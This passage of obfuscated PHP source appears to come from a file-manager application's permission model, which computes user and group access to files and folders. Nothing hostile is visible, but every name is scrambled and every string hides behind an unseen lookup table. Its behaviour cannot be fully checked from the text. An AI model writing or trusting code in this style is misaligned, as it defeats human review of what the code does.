$€òΩºªâ =& $_SERVER[ˆë€Ï⁄∂]; $∫ÛÛ•ŸÎ = $this->getAllChildrenByUser($Ú⁄”î±©, $ïßù”§Ê); if (!$‚¸Œ¬ıË || !$∫ÛÛ•ŸÎ) { return !1; } foreach ($∫ÛÛ•ŸÎ as $ñ¡˘ãﬂé) { $É¿√∆‰† = array(); foreach ($ñ¡˘ãﬂé[$€òΩºªâ[2180]] as $∏Äü‰ñÉ) { $î«∞ƒ≈È = $∏Äü‰ñÉ[$€òΩºªâ[551]]; $˛î‡Í∆Ω = $∏Äü‰ñÉ[$€òΩºªâ[1787]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $óüÚ≠ÊÜ = $∏Äü‰ñÉ[$€òΩºªâ[1787]] ? $∏Äü‰ñÉ[$€òΩºªâ[1787]] : $∏Äü‰ñÉ[$€òΩºªâ[1988]]; if ($∏Äü‰ñÉ[$€òΩºªâ[1787]] && $∏Äü‰ñÉ[$€òΩºªâ[1787]] == $ïßù”§Ê) { continue; } $É¿√∆‰†[] = array($€òΩºªâ[203] => $ñ¡˘ãﬂé[$€òΩºªâ[203]], $€òΩºªâ[200] => $˛î‡Í∆Ω, $€òΩºªâ[580] => intval($óüÚ≠ÊÜ), $€òΩºªâ[2096] => isset($î«∞ƒ≈È[$€òΩºªâ[486]]) ? intval($î«∞ƒ≈È[$€òΩºªâ[486]]) : 0, $€òΩºªâ[2160] => isset($î«∞ƒ≈È[$€òΩºªâ[2160]]) ? intval($î«∞ƒ≈È[$€òΩºªâ[2160]]) : -1); } $É¿√∆‰†[] = array($€òΩºªâ[203] => $ñ¡˘ãﬂé[$€òΩºªâ[203]], $€òΩºªâ[200] => SourceModel::TYPE_USER, $€òΩºªâ[580] => intval($ïßù”§Ê), $€òΩºªâ[2096] => intval($‚¸Œ¬ıË), $€òΩºªâ[2160] => -1); $this->where(array($€òΩºªâ[502] => $ñ¡˘ãﬂé[$€òΩºªâ[203]]))->delete(); $this->addAll($É¿√∆‰†); } return !0; } public function get($¬êØ¶˜‡) { $≠—¿∂Î“ = $this->getSourceList(array($¬êØ¶˜‡), !0); return $≠—¿∂Î“[0]; } public function getSourceList($åΩ¶€È©, $ÔøÔÑ¸¢ = false, $——µñ¶— = false) { $’‘¥¡ŒÎ =& $_SERVER[ˆë€Ï⁄∂]; if (!$åΩ¶€È©) { return array(); } $ß‹ëñ∏⁄ = Model($’‘¥¡ŒÎ[1436]); if (!$ÔøÔÑ¸¢ && count($åΩ¶€È©) == 1) { $ÔøÔÑ¸¢ = array(); $ÔøÔÑ¸¢[$åΩ¶€È©[0]] = $ß‹ëñ∏⁄->sourceInfo($åΩ¶€È©[0]); } if (!$ÔøÔÑ¸¢) { $»ñ©¡∞† = array($’‘¥¡ŒÎ[502] => array($’‘¥¡ŒÎ[503], $åΩ¶€È©)); $ÔøÔÑ¸¢ = $ß‹ëñ∏⁄->field($’‘¥¡ŒÎ[2184])->where($»ñ©¡∞†)->select(); $ÔøÔÑ¸¢ = array_to_keyvalue($ÔøÔÑ¸¢, $’‘¥¡ŒÎ[203]); } $œ∑Ï¶–„ = $åΩ¶€È©; foreach ($ÔøÔÑ¸¢ as $Ãø‹Ñ¥¨ => $éÛº»Ωû) { $ö≠“ŸÎü = $ß‹ëñ∏⁄->parentLevelArray($éÛº»Ωû[$’‘¥¡ŒÎ[595]]); $œ∑Ï¶–„ = array_merge($œ∑Ï¶–„, array($Ãø‹Ñ¥¨), array_reverse($ö≠“ŸÎü)); } $œ∑Ï¶–„ = array_values(array_unique($œ∑Ï¶–„)); if (!$œ∑Ï¶–„) { return array(); } $£ò„˚øÊ = $this->sourceAuthSelect($œ∑Ï¶–„); $¸¥ß§¡ë = array(); foreach ($œ∑Ï¶–„ as $œ…¬‡”·) { if (isset($£ò„˚øÊ[$œ…¬‡”·])) { $¸¥ß§¡ë[$œ…¬‡”·] = $£ò„˚øÊ[$œ…¬‡”·]; } } $è‡¶Ê∆â = $this->userIsRoot($——µñ¶—); $Ôï’—öä = AuthModel::authAll(); $¨÷ï®Ô∂ = array($’‘¥¡ŒÎ[499] => $Ôï’—öä, $’‘¥¡ŒÎ[2185] => array($’‘¥¡ŒÎ[504] => 0, $’‘¥¡ŒÎ[1994] => $Ôï’—öä, $’‘¥¡ŒÎ[505] => LNG($’‘¥¡ŒÎ[2186]), $’‘¥¡ŒÎ[2011] => $’‘¥¡ŒÎ[2187])); $•ºÈ†¯— = array(); foreach ($ÔøÔÑ¸¢ as $œ…¬‡”· => $‘ëâß¸˚) { if ($è‡¶Ê∆â && $GLOBALS[$’‘¥¡ŒÎ[6]][$’‘¥¡ŒÎ[2007]]) { $•ºÈ†¯—[$œ…¬‡”·] = $¨÷ï®Ô∂; continue; } $•ºÈ†¯—[$œ…¬‡”·] = $this->makeSourceAuth($‘ëâß¸˚, $¸¥ß§¡ë, $——µñ¶—); } return $•ºÈ†¯—; } public function authDeepCheck($≠˛’µπ÷, $˙˙öÿ·ò = false) { $‘ïô°≈≈ =& $_SERVER[ˆë€Ï⁄∂]; $˙˙öÿ·ò = $˙˙öÿ·ò ? $˙˙öÿ·ò : USER_ID; $⁄¬Ê∆´œ = $this->makeAuthDeep($˙˙öÿ·ò); if (!in_array($≠˛’µπ÷, $⁄¬Ê∆´œ[$‘ïô°≈≈[2188]])) { return !1; } $ÁƒÜ∂Œ = array(); foreach ($⁄¬Ê∆´œ[$‘ïô°≈≈[2189]] as $ÇÎÌöÒ® => $ößÒ´Üó) { if (!in_array($≠˛’µπ÷, $ößÒ´Üó)) { continue; } $ÁƒÜ∂Œ[] = $ÇÎÌöÒ®; } if (!$ÁƒÜ∂Œ) { return !1; } $ìÛı—˙› = $ÁƒÜ∂Œ ? $ÁƒÜ∂Œ[0] : $≠˛’µπ÷; return array($‘ïô°≈≈[499] => -1, $‘ïô°≈≈[551] => array($‘ïô°≈≈[504] => $‘ïô°≈≈[1288], $‘ïô°≈≈[1994] => $‘ïô°≈≈[240], $‘ïô°≈≈[505] => LNG($‘ïô°≈≈[2190]), $‘ïô°≈≈[2011] => $‘ïô°≈≈[2191]), $‘ïô°≈≈[2192] => LNG($‘ïô°≈≈[2193]), $‘ïô°≈≈[2194] => $this->sourceAuthInfo($ìÛı—˙›)); } protected function makeAuthDeep($ôÖê…ëÆ = false) { $˝±õØ–¯ =& $_SERVER[ˆë€Ï⁄∂]; static $…›áÎ±À = array(); $ôÖê…ëÆ = $ôÖê…ëÆ ? $ôÖê…ëÆ : USER_ID; if (isset($…›áÎ±À[$ôÖê…ëÆ])) { return $…›áÎ±À[$ôÖê…ëÆ]; } $˙™›˙∑¡ = Model($˝±õØ–¯[2195])->listData(); $ôıÂªÅ˘ = array(); foreach ($˙™›˙∑¡ as $í˛∞◊ä´) { if ($í˛∞◊ä´[$˝±õØ–¯[498]] == 0 && $í˛∞◊ä´[$˝±õØ–¯[2010]] == $˝±õØ–¯[101]) { $ôıÂªÅ˘[] = $í˛∞◊ä´[$˝±õØ–¯[486]]; } } $°¸¸Â£¥ = $this->userGroupParents($ôÖê…ëÆ); $¨Ì°Û¬ß = array($˝±õØ–¯[200] => SourceModel::TYPE_USER, $˝±õØ–¯[580] => $ôÖê…ëÆ); if ($°¸¸Â£¥) { $¨Ì°Û¬ß = array(array($˝±õØ–¯[200] => SourceModel::TYPE_USER, $˝±õØ–¯[580] => $ôÖê…ëÆ), array($˝±õØ–¯[200] => SourceModel::TYPE_GROUP, $˝±õØ–¯[580] => array($˝±õØ–¯[503], $°¸¸Â£¥)), $˝±õØ–¯[1092] => $˝±õØ–¯[2090]); } $Õ§·ÈÆÓ = $this->field($˝±õØ–¯[2196])->where($¨Ì°Û¬ß)->select(); $Ö˜íœæ = array(); $‘ãôìÔÑ = array_to_keyvalue_group($Õ§·ÈÆÓ, $˝±õØ–¯[203]); foreach ($‘ãôìÔÑ as $ªûˆ”éÑ => $∫‚˘°ΩÚ) { $ß√⁄íÜ¸ = $this->authArrayCheck($∫‚˘°ΩÚ, $ôÖê…ëÆ); if ($ß√⁄íÜ¸[$˝±õØ–¯[499]] > 0) { $Ö˜íœæ[] = $ªûˆ”éÑ . $˝±õØ–¯[12]; } } if ($°¸¸Â£¥) { $Ø†•Ô⁄À = Model($˝±õØ–¯[596]); foreach ($°¸¸Â£¥ as $–àäà£Æ) { $ø„§∏Âﬂ = $Ø†•Ô⁄À->getInfo($–àäà£Æ); if (!$ø„§∏Âﬂ || !is_array($ø„§∏Âﬂ[$˝±õØ–¯[100]])) { continue; } $Ö˜íœæ[] = $ø„§∏Âﬂ[$˝±õØ–¯[100]][$˝±õØ–¯[203]]; } } $‰ƒÏ–ññ = array(); $§«À∂Àä = $°¸¸Â£¥; $∆ÅÔó¢ﬁ = Model($˝±õØ–¯[1436]); $Ø†•Ô⁄À = Model($˝±õØ–¯[596]); $ó≤ô¬◊Ç = array(); $˙ï«◊èß = array(); $Ë≥€Óå∞ = array(); $ÄËÁº¬ = array(); if ($Ö˜íœæ) { $·ù‰Âì∂ = $∆ÅÔó¢ﬁ->where(array($˝±õØ–¯[203] => array($˝±õØ–¯[503], $Ö˜íœæ)))->select(); foreach ($·ù‰Âì∂ as $∞Æ»ÅÖñ) { if ($∞Æ»ÅÖñ[$˝±õØ–¯[516]] == $˝±õØ–¯[101]) { continue; } $ïöüØ¸∫ = $∆ÅÔó¢ﬁ->parentLevelArray($∞Æ»ÅÖñ[$˝±õØ–¯[595]]); $‰ƒÏ–ññ = array_merge($‰ƒÏ–ññ, $ïöüØ¸∫); $§«À∂Àä[] = $∞Æ»ÅÖñ[$˝±õØ–¯[580]]; $ó≤ô¬◊Ç[$∞Æ»ÅÖñ[$˝±õØ–¯[203]]] = $ïöüØ¸∫; $˙ï«◊èß[$∞Æ»ÅÖñ[$˝±õØ–¯[203]]] = $∞Æ»ÅÖñ[$˝±õØ–¯[580]]; } } $§«À∂Àä = array_values(array_unique($§«À∂Àä)); $Î°ü¬‰ñ = $§«À∂Àä; foreach ($Î°ü¬‰ñ as $–àäà£Æ) { $ø„§∏Âﬂ = $Ø†•Ô⁄À->getInfo($–àäà£Æ); $ïöüØ¸∫ = $∆ÅÔó¢ﬁ->parentLevelArray($ø„§∏Âﬂ[$˝±õØ–¯[595]]); $§«À∂Àä = array_merge($§«À∂Àä, $ïöüØ¸∫); } $§«À∂Àä = array_values(array_unique($§«À∂Àä)); foreach ($§«À∂Àä as $–àäà£Æ) { $ø„§∏Âﬂ = $Ø†•Ô⁄À->getInfo($–àäà£Æ); $‰ƒÏ–ññ[] = $ø„§∏Âﬂ[$˝±õØ–¯[100]][$˝±õØ–¯[203]]; $Ë≥€Óå∞[$–àäà£Æ] = $ø„§∏Âﬂ[$˝±õØ–¯[100]][$˝±õØ–¯[203]]; $ÄËÁº¬[$–àäà£Æ] = $∆ÅÔó¢ﬁ->parentLevelArray($ø„§∏Âﬂ[$˝±õØ–¯[595]]); } foreach ($ó≤ô¬◊Ç as $õçŒàÿì => $≥˜ ◊ØÆ) { $•æ¸¨Áô = $˙ï«◊èß[$õçŒàÿì]; if (!$•æ¸¨Áô || !$Ë≥€Óå∞[$•æ¸¨Áô]) { continue; } $‚ù—†Ù” = array(); foreach ($ÄËÁº¬[$•æ¸¨Áô] as $–àäà£Æ) { $‚ù—†Ù”[] = $Ë≥€Óå∞[$–àäà£Æ]; } $ó≤ô¬◊Ç[$õçŒàÿì] = array_merge($‚ù—†Ù”, $≥˜ ◊ØÆ); } $‰ƒÏ–ññ = array_values(array_unique($‰ƒÏ–ññ)); $†ªÿÃù≤ = array($˝±õØ–¯[2188] => $‰ƒÏ–ññ, $˝±õØ–¯[2189] => $ó≤ô¬◊Ç); $…›áÎ±À[$ôÖê…ëÆ] = $†ªÿÃù≤; return $†ªÿÃù≤; } private function makeSourceAuth($ òø¯¢◊, $ÿ—ñî∆é, $˘ƒäÃµ≥ = false) { $º˘Ñò◊Ò =& $_SERVER[ˆë€Ï⁄∂]; $¨‡¸ƒ»ª = $º˘Ñò◊Ò[101]; $áÖÕ÷òÉ = $ òø¯¢◊[$º˘Ñò◊Ò[580]]; $ÃﬁöÓ√ = $ òø¯¢◊[$º˘Ñò◊Ò[200]] == SourceModel::TYPE_GROUP; $ﬂÏ√Í©È = $ÃﬁöÓ√ ? $this->groupRootAuth($áÖÕ÷òÉ, $˘ƒäÃµ≥) : !1; if ($ﬂÏ√Í©È && Model($º˘Ñò◊Ò[582])->authCheckAction($ﬂÏ√Í©È[$º˘Ñò◊Ò[498]], $º˘Ñò◊Ò[2009])) { return $this->groupAuthInfo($ﬂÏ√Í©È, $áÖÕ÷òÉ); } $ºµŸüü˚ = Model($º˘Ñò◊Ò[1436])->parentLevelArray($ òø¯¢◊[$º˘Ñò◊Ò[595]]); $ºµŸüü˚ = array_merge(array($ òø¯¢◊[$º˘Ñò◊Ò[203]]), array_reverse($ºµŸüü˚)); $≠ìí◊≥Ä = !1; foreach ($ºµŸüü˚ as $‡≤Ê‰»¬) { if (!isset($ÿ—ñî∆é[$‡≤Ê‰»¬])) { continue; } $≤ìõ˘≥Ú = $this->authMake($ÿ—ñî∆é[$‡≤Ê‰»¬], $˘ƒäÃµ≥); if ($≤ìõ˘≥Ú[$º˘Ñò◊Ò[551]]) { $≠ìí◊≥Ä = $≤ìõ˘≥Ú; break; } } if (!$ÃﬁöÓ√) { return $≠ìí◊≥Ä; } if (!$≠ìí◊≥Ä && $ﬂÏ√Í©È) { $≠ìí◊≥Ä = $this->groupAuthInfo($ﬂÏ√Í©È, $áÖÕ÷òÉ); } if (!$≠ìí◊≥Ä) { $èá∑Ö∞€ = Model($º˘Ñò◊Ò[596])->getInfo($áÖÕ÷òÉ); $‡Â∑Øºä = explode($º˘Ñò◊Ò[50], trim($èá∑Ö∞€[$º˘Ñò◊Ò[595]], $º˘Ñò◊Ò[50])); $‡Â∑Øºä = array_reverse($‡Â∑Øºä); foreach ($‡Â∑Øºä as $˚˘ïÌ¥¶) { if ($˚˘ïÌ¥¶ == $º˘Ñò◊Ò[240] || $˚˘ïÌ¥¶ == $¨‡¸ƒ»ª) { continue; } $Œ†ºÊü = $this->groupRootAuth($˚˘ïÌ¥¶, $˘ƒäÃµ≥); if (!$Œ†ºÊü) { continue; } $≠ìí◊≥Ä = $this->groupAuthInfo($Œ†ºÊü, $˚˘ïÌ¥¶); break; } } if (!$≠ìí◊≥Ä || $≠ìí◊≥Ä[$º˘Ñò◊Ò[499]] <= 0) { $√ßÇ≠‡≠ = $this->authDeepCheck($ òø¯¢◊[$º˘Ñò◊Ò[203]], $˘ƒäÃµ≥); if ($√ßÇ≠‡≠) { $≠ìí◊≥Ä = $√ßÇ≠‡≠; } } return $≠ìí◊≥Ä; } private function userIsRoot($ÂÁ©Ω≥ = false) { $˜·Î‚Ó¥ =& $_SERVER[ˆë€Ï⁄∂]; if (!$ÂÁ©Ω≥ && KodUser::isRoot()) { return !0; } $µˆ–‰ÿ≤ = Model($˜·Î‚Ó¥[608])->getInfo($ÂÁ©Ω≥); $ˆÄàúãÓ = Model($˜·Î‚Ó¥[2197])->listData($µˆ–‰ÿ≤[$˜·Î‚Ó¥[2198]]); if ($ˆÄàúãÓ && $ˆÄàúãÓ[$˜·Î‚Ó¥[586]][$˜·Î‚Ó¥[2199]] == 1) { return !0; } return !1; } private function sourceAuthInfo($‰»ÛÚÿ£) { $çˆßù¨ë =& $_SERVER[ˆë€Ï⁄∂]; $î—Ω◊∏ƒ = Model($çˆßù¨ë[1436]); $◊ÈΩæ≤É = $î—Ω◊∏ƒ->sourceInfo($‰»ÛÚÿ£); if (!$◊ÈΩæ≤É) { return !1; } $î—Ω◊∏ƒ->groupPathDisplay($◊ÈΩæ≤É); $ô¥◊Ö≈´ = array($◊ÈΩæ≤É); $ô¥◊Ö≈´ = $î—Ω◊∏ƒ->_listAppendPath($ô¥◊Ö≈´); $◊ÈΩæ≤É = $ô¥◊Ö≈´[0]; $˚„±í…ƒ = $◊ÈΩæ≤É[$çˆßù¨ë[593]]; if (isset($◊ÈΩæ≤É[$çˆßù¨ë[601]])) { $äﬁâÑ†â = explode($çˆßù¨ë[8], trim($◊ÈΩæ≤É[$çˆßù¨ë[593]], $çˆßù¨ë[8])); array_shift($äﬁâÑ†â); $˚„±í…ƒ = $◊ÈΩæ≤É[$çˆßù¨ë[599]] . $çˆßù¨ë[2200] . implode($çˆßù¨ë[8], $äﬁâÑ†â); } return array($çˆßù¨ë[505] => $◊ÈΩæ≤É[$çˆßù¨ë[32]], $çˆßù¨ë[97] => KodIO::make($◊ÈΩæ≤É[$çˆßù¨ë[203]]), $çˆßù¨ë[2201] => $˚„±í…ƒ); } private function groupAuthInfo($ß‡Æ”ìÌ, $˜™«Ïµ∏) { $”íËÍ≤» =& $_SERVER[ˆë€Ï⁄∂]; $¬ˆâ»—œ = Model($”íËÍ≤»[596])->getInfo($˜™«Ïµ∏); return array($”íËÍ≤»[2202] => intval($ß‡Æ”ìÌ[$”íËÍ≤»[498]]), $”íËÍ≤»[2185] => $ß‡Æ”ìÌ, $”íËÍ≤»[2203] => LNG($”íËÍ≤»[2204]), $”íËÍ≤»[2194] => array($”íËÍ≤»[505] => $¬ˆâ»—œ[$”íËÍ≤»[32]], $”íËÍ≤»[97] => KodIO::make($¬ˆâ»—œ[$”íËÍ≤»[100]][$”íËÍ≤»[203]]), $”íËÍ≤»[2201] => $¬ˆâ»—œ[$”íËÍ≤»[600]])); } protected function groupRootAuth($âµßÖÚá, $∑Á¥îû… = false) { $´º›˘ÌÇ =& $_SERVER[ˆë€Ï⁄∂]; $∑Á¥îû… = $∑Á¥îû… ? $∑Á¥îû… : USER_ID; $ˆ•ãœ°ù = $∑Á¥îû… . $´º›˘ÌÇ[2205] . $âµßÖÚá; static $Ï€ø≥∏ = array(); if (isset($Ï€ø≥∏[$ˆ•ãœ°ù])) { return $Ï€ø≥∏[$ˆ•ãœ°ù]; } $å™îÃÕ¬ = Model($´º›˘ÌÇ[596])->getInfo($âµßÖÚá); $Õ˘ü¯–è = $this->userGroupList($∑Á¥îû…); $≤πá¢ç† = isset($Õ˘ü¯–è[$âµßÖÚá]) ? $Õ˘ü¯–è[$âµßÖÚá][$´º›˘ÌÇ[498]] : !1; if ($≤πá¢ç† && Model($´º›˘ÌÇ[582])->authCheckAction($≤πá¢ç†[$´º›˘ÌÇ[498]], $´º›˘ÌÇ[2009])) { $Ï€ø≥∏[$ˆ•ãœ°ù] = $≤πá¢ç†; return $≤πá¢ç†; } $ ıÒÔ«∫ = $this->sourceAuthSelect($å™îÃÕ¬[$´º›˘ÌÇ[100]][$´º›˘ÌÇ[203]]); $ã§®Ëƒ‹ = $ ıÒÔ«∫ ? $this->authMake($ ıÒÔ«∫, $∑Á¥îû…) : !1; $’ Ü„Ü£ = $ã§®Ëƒ‹ ? $ã§®Ëƒ‹[$´º›˘ÌÇ[551]] : !1; $Ï€ø≥∏[$ˆ•ãœ°ù] = $’ Ü„Ü£ ? $’ Ü„Ü£ : $≤πá¢ç†; return $Ï€ø≥∏[$ˆ•ãœ°ù]; } public function authOwnerApply($ı∏¨œˆπ) { $€ßÎüà˚ =& $_SERVER[ˆë€Ï⁄∂]; if (empty($ı∏¨œˆπ[$€ßÎüà˚[498]]) || isset($ı∏¨œˆπ[$€ßÎüà˚[2206]]) && $ı∏¨œˆπ[$€ßÎüà˚[2206]]) { return $ı∏¨œˆπ; } if (AuthModel::authCheckRoot($ı∏¨œˆπ[$€ßÎüà˚[498]][$€ßÎüà˚[499]])) { return $ı∏¨œˆπ; } $Åı°”∏ø = Model($€ßÎüà˚[1436])->parentLevelArray($ı∏¨œˆπ[$€ßÎüà˚[595]]); $Åı°”∏ø = array_merge(array($ı∏¨œˆπ[$€ßÎüà˚[203]]), array_reverse($Åı°”∏ø)); $√ò¢ñÆπ = $this->sourceAuthSelect($Åı°”∏ø); $Æ∑∆Ò˚Ä = array(); $‚•Íÿ€∂ = array(); foreach ($√ò¢ñÆπ as $…±”ﬂõ⁄ => $´Îïçá) { $Æ’‘‘—± = $this->authFolderOwnerUser($´Îïçá); $Æ∑∆Ò˚Ä[$…±”ﬂõ⁄] = $Æ’‘‘—±; $‚•Íÿ€∂ = array_merge($‚•Íÿ€∂, $Æ’‘‘—±[$€ßÎüà˚[676]]); if ($Æ’‘‘—±[$€ßÎüà˚[2207]]) { break; } } if (count($‚•Íÿ€∂) == 0) { $‚•Íÿ€∂ = $this->authFolderOwnerGroup($ı∏¨œˆπ[$€ßÎüà˚[580]]); } $‚•Íÿ€∂ = array_unique($‚•Íÿ€∂); if (AuthModel::authCheckRoot($ı∏¨œˆπ[$€ßÎüà˚[498]][$€ßÎüà˚[499]])) { $‚•Íÿ€∂[] = USER_ID; } $ı∏¨œˆπ[$€ßÎüà˚[498]][$€ßÎüà˚[2208]] = Model($€ßÎüà˚[588])->userListInfo($‚•Íÿ€∂); return $ı∏¨œˆπ; } private function authFolderOwnerGroup($¡ÔîÉ˘Ä) { $ü≈˝ó˝º =& $_SERVER[ˆë€Ï⁄∂]; $˜´⁄˜∑® = Model($ü≈˝ó˝º[2082])->where(array($ü≈˝ó˝º[1988] => $¡ÔîÉ˘Ä))->select(); $ÂÕ„‹¶â = array(); if (!$˜´⁄˜∑®) { return $ÂÕ„‹¶â; } foreach ($˜´⁄˜∑® as $ÁÏ—ßﬁá) { $‡ÃÜÔÏ€ = $this->authInfo($ÁÏ—ßﬁá); if (AuthModel::authCheckRoot($‡ÃÜÔÏ€[$ü≈˝ó˝º[498]])) { $ÂÕ„‹¶â[] = $ÁÏ—ßﬁá[$ü≈˝ó˝º[1787]]; } } return $ÂÕ„‹¶â; } private function authFolderOwnerUser($ä•é¥Ωë) { $ã√Æ˝Î∞ =& $_SERVER[ˆë€Ï⁄∂]; $÷˙π¨œ† = array(); $£ÕÉáîŒ = !1; foreach ($ä•é¥Ωë as $¬ÿ“ﬁèç) { $˘í‚Í°≤ = $this->authInfo($¬ÿ“ﬁèç); if ($¬ÿ“ﬁèç[$ã√Æ˝Î∞[580]] == $ã√Æ˝Î∞[240]) { $£ÕÉáîŒ = !0; } if ($¬ÿ“ﬁèç[$ã√Æ˝Î∞[200]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($˘í‚Í°≤[$ã√Æ˝Î∞[498]])) { $÷˙π¨œ†[] = $¬ÿ“ﬁèç[$ã√Æ˝Î∞[580]]; } } } return array($ã√Æ˝Î∞[676] => $÷˙π¨œ†, $ã√Æ˝Î∞[2207] => $£ÕÉáîŒ); } public function authMake($òÚ€§¡¬, $ì≠öÿÓÚ = false) { $˚ûú€Çï =& $_SERVER[ˆë€Ï⁄∂]; $Ü¨°Ìª˛ = $this->authArrayCheck($òÚ€§¡¬, $ì≠öÿÓÚ); if ($Ü¨°Ìª˛[$˚ûú€Çï[2209]]) { $Ü¨°Ìª˛[$˚ûú€Çï[2209]] = $this->sourceAuthInfo($Ü¨°Ìª˛[$˚ûú€Çï[2209]]); } return $Ü¨°Ìª˛; } public function authArrayCheck($ı§≥´ŸÄ, $∫§Œ¯“‰ = false) { $öÿ–õº =& $_SERVER[ˆë€Ï⁄∂]; if (!$ı§≥´ŸÄ) { return array($öÿ–õº[499] => 0, $öÿ–õº[551] => !1); } $∫§Œ¯“‰ = $∫§Œ¯“‰ ? $∫§Œ¯“‰ : USER_ID; $„êıΩˆ´ = 0; $˛Åû§ª⁄ = 0; $⁄∆‹ƒÅﬁ = 0; $ﬂë•∞¥ò = 0; $œ¶„π„ö = 0; $π∞Òﬂ“∆ = 0; $Õ≈ﬁé“Ê = 1000; $Ÿü€–Å˚ = 0; $∏Ã‡ØÂ = 0; $≥êƒ–˜Ú = 0; $ì√µÙ¨µ = 0; $œÙ∂≈• = array($öÿ–õº[203] => 0); foreach ($ı§≥´ŸÄ as $œÙ∂≈•) { $±¸‘Å©Ú = $this->authInfo($œÙ∂≈•); if (!$±¸‘Å©Ú) { continue; } $Œüùﬂæ¶ = $œÙ∂≈•[$öÿ–õº[580]]; $•≤‚Äâè = intval($±¸‘Å©Ú[$öÿ–õº[498]]); if ($œÙ∂≈•[$öÿ–õº[200]] == SourceModel::TYPE_USER && $Œüùﬂæ¶ == $∫§Œ¯“‰) { $„êıΩˆ´ = !0; $⁄∆‹ƒÅﬁ = $±¸‘Å©Ú; $˛Åû§ª⁄ = $•≤‚Äâè; } else { if ($œÙ∂≈•[$öÿ–õº[200]] == SourceModel::TYPE_GROUP && $this->groupContainUser($Œüùﬂæ¶, $∫§Œ¯“‰)) { $ﬂë•∞¥ò = !0; $ÑÅ„È¯Ñ = $this->groupStepToUserGroup($Œüùﬂæ¶, $∫§Œ¯“‰); if ($ÑÅ„È¯Ñ < $Õ≈ﬁé“Ê) { $Õ≈ﬁé“Ê = $ÑÅ„È¯Ñ; $œ¶„π„ö = $•≤‚Äâè; $π∞Òﬂ“∆ = $±¸‘Å©Ú; $Ÿü€–Å˚ = $Œüùﬂæ¶; } if ($ÑÅ„È¯Ñ == $Õ≈ﬁé“Ê && $•≤‚Äâè >= $œ¶„π„ö) { $œ¶„π„ö = $•≤‚Äâè; $π∞Òﬂ“∆ = $±¸‘Å©Ú; $Ÿü€–Å˚ = $Œüùﬂæ¶; } } else { if ($Œüùﬂæ¶ == $öÿ–õº[240]) { $∏Ã‡ØÂ = !0; $ì√µÙ¨µ = $±¸‘Å©Ú; $≥êƒ–˜Ú = $•≤‚Äâè; } } } } if ($„êıΩˆ´) { $Ú§¶»Î‰ = $˛Åû§ª⁄; $±¸‘Å©Ú = $⁄∆‹ƒÅﬁ; $òèÿè£‡ = LNG($öÿ–õº[2210]); } else { if ($ﬂë•∞¥ò) { $Ú§¶»Î‰ = $œ¶„π„ö; $±¸‘Å©Ú = $π∞Òﬂ“∆; $ÒÚµ‹Çë = Model($öÿ–õº[596])->getInfo($Ÿü€–Å˚); $òèÿè£‡ = $öÿ–õº[186] . $ÒÚµ‹Çë[$öÿ–õº[600]] . $öÿ–õº[2211] . LNG($öÿ–õº[2212]); } else { if ($∏Ã‡ØÂ) { $Ú§¶»Î‰ = $≥êƒ–˜Ú; $±¸‘Å©Ú = $ì√µÙ¨µ; $òèÿè£‡ = LNG($öÿ–õº[2182]); } else { $Ú§¶»Î‰ = 0; $±¸‘Å©Ú = !1; $òèÿè£‡ = $öÿ–õº[12]; } } } $ç‡ä”Á◊ = array($öÿ–õº[2202] => intval($Ú§¶»Î‰), $öÿ–õº[2185] => $±¸‘Å©Ú, $öÿ–õº[2203] => $òèÿè£‡, $öÿ–õº[2194] => $œÙ∂≈•[$öÿ–õº[203]]); return $ç‡ä”Á◊; } private function groupContainUser($´◊ç◊ì€, $õ÷‚°»â = false) { return in_array($´◊ç◊ì€, $this->userGroupParents($õ÷‚°»â)); } private function groupStepToUserGroup($¿“µ¯õ–, $ö‹ˆÀÜ˛ = false) { $™’ƒ•’® =& $_SERVER[ˆë€Ï⁄∂]; $ÈÌÿΩ’Â = $this->userGroupList($ö‹ˆÀÜ˛); $ﬁ®˘Èã˛ = 1000; $Ü‚ïíﬁö = $GLOBALS[$™’ƒ•’®[6]][$™’ƒ•’®[102]][$™’ƒ•’®[2095]] == 1; $Ä≤àÓŸê = $Ü‚ïíﬁö ? 3 : 2; foreach ($ÈÌÿΩ’Â as $π˜â‘Í) { if ($π˜â‘Í[$™’ƒ•’®[1988]] == $¿“µ¯õ–) { return 0; } $ñ˙ŸÕúµ = explode($™’ƒ•’®[50], trim($π˜â‘Í[$™’ƒ•’®[595]], $™’ƒ•’®[50])); if ($ñ˙ŸÕúµ[0] == $™’ƒ•’®[240] && count($ñ˙ŸÕúµ) > $Ä≤àÓŸê) { $üÍœÀ∆ = array_reverse(array_slice($ñ˙ŸÕúµ, $Ä≤àÓŸê)); $‹˝Ø˜ﬂ∞ = array_search($¿“µ¯õ–, $üÍœÀ∆); if ($‹˝Ø˜ﬂ∞ !== !1 && $‹˝Ø˜ﬂ∞ + 1 <= $ﬁ®˘Èã˛) { $ﬁ®˘Èã˛ = $‹˝Ø˜ﬂ∞ + 1; } } } return $ﬁ®˘Èã˛; } private function userGroupList($ƒËÊ˛ÇÇ = false) { $ª¨ß‡’ä =& $_SERVER[ˆë€Ï⁄∂]; static $æ∏¸„∞¥ = array(); if (isset($æ∏¸„∞¥[$ƒËÊ˛ÇÇ])) { return $æ∏¸„∞¥[$ƒËÊ˛ÇÇ]; } $…π®°á∫ = Model($ª¨ß‡’ä[608])->getInfo($ƒËÊ˛ÇÇ); $æ∏¸„∞¥[$ƒËÊ˛ÇÇ] = array_to_keyvalue($…π®°á∫[$ª¨ß‡’ä[2183]], $ª¨ß‡’ä[1988]); return $æ∏¸„∞¥[$ƒËÊ˛ÇÇ]; } public function userGroupParents($‹õŸáû‹) { $Å≤ºÀª¶ =& $_SERVER[ˆë€Ï⁄∂]; static $⁄Áã™ò≈ = array(); $‹õŸáû‹ = $‹õŸáû‹ ? $‹õŸáû‹ : USER_ID; if (isset($⁄Áã™ò≈[$‹õŸáû‹])) { return $⁄Áã™ò≈[$‹õŸáû‹]; } $µ∞≥ã´¿ = $this->userGroupList($‹õŸáû‹); $·–Ã„‰Ò = array(); $ÃÖàÇ∫â = $GLOBALS[$Å≤ºÀª¶[6]][$Å≤ºÀª¶[102]][$Å≤ºÀª¶[2095]] == 1; $ˆÔ¨ÈâÊ = $ÃÖàÇ∫â ? 3 : 2; foreach ($µ∞≥ã´¿ as $øﬂôõ»ñ) { $áπú¶ÀÕ = array($øﬂôõ»ñ[$Å≤ºÀª¶[1988]]); $‡ª†Ø˘Ï = explode($Å≤ºÀª¶[50], trim($øﬂôõ»ñ[$Å≤ºÀª¶[595]], $Å≤ºÀª¶[50])); if 